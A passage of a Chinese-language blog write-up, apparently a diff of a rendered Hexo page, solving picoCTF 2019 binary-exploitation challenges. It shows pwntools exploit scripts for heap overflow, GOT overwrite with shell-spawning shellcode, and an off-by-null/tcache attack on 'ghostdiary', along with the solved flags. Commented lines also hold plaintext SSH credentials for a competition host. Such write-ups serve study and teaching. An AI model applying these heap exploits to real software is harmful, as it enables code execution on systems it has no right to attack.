class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> hex(dest)</span><br><span class="line">p.sendline(<span class="string">'kangel'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"useful..."</span>)</span><br><span class="line">exit_got = <span class="number">0x804d02c</span></span><br><span class="line">payload = p32(exit_got<span class="number">-12</span>) </span><br><span class="line">payload += p32(dest+<span class="number">8</span>)</span><br><span class="line">payload += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">  jmp sc</span></span><br><span class="line"><span class="string">  &#123;&#125;</span></span><br><span class="line"><span class="string">sc:</span></span><br><span class="line"><span class="string">  nop</span></span><br><span class="line"><span class="string">  '''</span>.format(<span class="string">'nop\n'</span>*<span class="number">100</span>)+shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{HeapHeapFlag_8342a39b}</code></p>
+<h4 id="Heap-overflow"><a href="#Heap-overflow" class="headerlink" title="Heap overflow"></a>Heap overflow</h4><p>利用heap overflow将lastname变成unsorted bin，然后如法炮制afterlife</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># s=ssh(host="2019shell1.picoctf.com",user="kangel",password="2314838574", port=22)</span></span><br><span class="line"><span class="comment"># s.set_working_directory("/problems/heap-overflow_1_3f101d883699357e88af6bd1165695cd")</span></span><br><span class="line"><span class="comment"># p = s.process("./vuln")</span></span><br><span class="line">p = process(<span class="string">'./vuln'</span>)</span><br><span class="line">dest = int(p.recvuntil(<span class="string">'Input'</span>).split(<span class="string">'\n'</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> hex(dest)</span><br><span class="line">exit_got = <span class="number">0x0804d02c</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span></span><br><span class="line">payload += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">  jmp sc</span></span><br><span class="line"><span class="string">  &#123;&#125;</span></span><br><span class="line"><span class="string">sc:</span></span><br><span class="line"><span class="string">  nop</span></span><br><span class="line"><span class="string">  '''</span>.format(<span class="string">'nop\n'</span>*<span class="number">100</span>)+shellcraft.sh())</span><br><span class="line">payload = payload.ljust(<span class="number">0x2a0</span><span class="number">-0x4</span>)</span><br><span class="line">payload += p32(<span class="number">0x49</span>).ljust(<span class="number">0x48</span>)</span><br><span class="line">payload += p32(<span class="number">0x101</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'fullname\n'</span>, payload)</span><br><span class="line">payload = p32(<span class="number">0x101</span>)</span><br><span class="line">payload += p32(exit_got<span class="number">-12</span>) </span><br><span class="line">payload += p32(dest+<span class="number">8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span><span class="number">-0x4</span>)+p32(<span class="number">0x101</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x100</span><span class="number">-4</span>)+ payload</span><br><span class="line">p.sendlineafter(<span class="string">'lastname\n'</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{a_s1mpl3_h3ap_04dbf101}</code></p>
+<h4 id="ghostdiary"><a href="#ghostdiary" class="headerlink" title="ghostdiary"></a>ghostdiary</h4><p>程序分析：</p>
+<ol>
+<li><p>New page in diary：创建堆块，大小为(0,0xf0]和(0x10f,0x1e0]</p>
+</li>
+<li><p>Talk with ghost：写入堆块，存在off by null 漏洞</p>
+</li>
+<li><p>Listen to ghost：打印堆块内容</p>
+</li>
+<li>Burn the page：删除堆块</li>
+</ol>
+<p>攻击思路：利用off by null使unsorted合并的时候产生堆块交叉，从而泄露libc基地址。再利用tcache attack将one_gadget覆盖free_hook。需要注意的是不能直接malloc大小为0xf8的堆块，所以可以配合0xf0和0x118使用。</p>
+<p>具体exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># s=ssh(host="2019shell1.picoctf.com",user="kangel",password="2314838574", port=22)</span></span><br><span class="line"><span class="comment"># s.set_working_directory("/problems/ghost-diary_0_3fe5c3d8597f5f041d53fd64c0d577d2")</span></span><br><span class="line">p = process(<span class="string">"/problems/ghost-diary_0_3fe5c3d8597f5f041d53fd64c0d577d2/ghostdiary"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,side)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(side))</span><br><span class="line">    p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(page,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Page: '</span>)</span><br><span class="line">    p.sendline(str(page))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(page)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Page: '</span>)</span><br><span class="line">    p.sendline(str(page))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(page)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Page: '</span>)</span><br><span class="line">	p.sendline(str(page))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	create(<span class="number">0xf0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	create(<span class="number">0x118</span>,<span class="number">2</span>)	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	delete(<span class="number">7</span>+i)</span><br><span class="line">delete(<span class="number">9</span>+<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">9</span>):</span><br><span class="line">	delete(<span class="number">7</span>+i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x110</span>*<span class="string">'a'</span>+p64(<span class="number">0x240</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xf0</span>*<span class="string">'a'</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x141</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">	create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc_base = u64(p.recvline()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log,success(<span class="string">"libc_addr:"</span>+hex(libc_base))</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">add(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    <div>
+    
+    <div> 
+ 
+<div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div> 
+
+ </div>
+
+    
+    </div>
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i>pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/01/PWN学习之UAF/" rel="next" title="PWN学习之UAF">
+                <i class="fa fa-chevron-left"></i> PWN学习之UAF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/0.jpg"
+                alt="kangel"/>
+            
+              <p class="site-author-name" itemprop="name">kangel</p>
+              <div class="site-description motion-element" itemprop="description">Life is beautiful!</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">27</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">22</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#practice-run-1"><span class="nav-number">1.</span> <span class="nav-text">practice-run-1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#handy-shellcode"><span class="nav-number">2.</span> <span class="nav-text">handy-shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#slippery-shellcode"><span class="nav-number">3.</span> <span class="nav-text">slippery-shellcode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OverFlow-0"><span class="nav-number">4.</span> <span class="nav-text">OverFlow 0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OverFlow-1"><span class="nav-number">5.</span> <span class="nav-text">OverFlow 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OverFlow-2"><span class="nav-number">6.</span> <span class="nav-text">OverFlow 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NewOverFlow-1"><span class="nav-number">7.</span> <span class="nav-text">NewOverFlow 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NewOverFlow-2"><span class="nav-number">8.</span> <span class="nav-text">NewOverFlow 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CanaRy"><span class="nav-number">9.</span> <span class="nav-text">CanaRy</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#程序分析"><span class="nav-number">9.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#攻击思路"><span class="nav-number">9.2.</span> <span class="nav-text">攻击思路</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#leap-frog"><span class="nav-number">10.</span> <span class="nav-text">leap-frog</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#messy-malloc"><span class="nav-number">11.</span> <span class="nav-text">messy-malloc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stringzz"><span class="nav-number">12.</span> <span class="nav-text">stringzz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GoT"><span class="nav-number">13.</span> <span class="nav-text">GoT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pointy"><span class="nav-number">14.</span> <span class="nav-text">pointy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#seed-spring"><span class="nav-number">15.</span> <span class="nav-text">seed_spring</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#limit"><span class="nav-number">16.</span> <span class="nav-text">limit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rop32"><span class="nav-number">17.</span> <span class="nav-text">rop32</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rop64"><span class="nav-number">18.</span> <span class="nav-text">rop64</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AfterLife"><span class="nav-number">19.</span> <span class="nav-text">AfterLife</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SecondLife"><span class="nav-number">20.</span> <span class="nav-text">SecondLife</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Heap-overflow"><span class="nav-number">21.</span> <span class="nav-text">Heap overflow</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ghostdiary"><span class="nav-number">22.</span> <span class="nav-text">ghostdiary</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kangel</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 --> <script type="text/javascript" src="/js/src/love.js"></script>
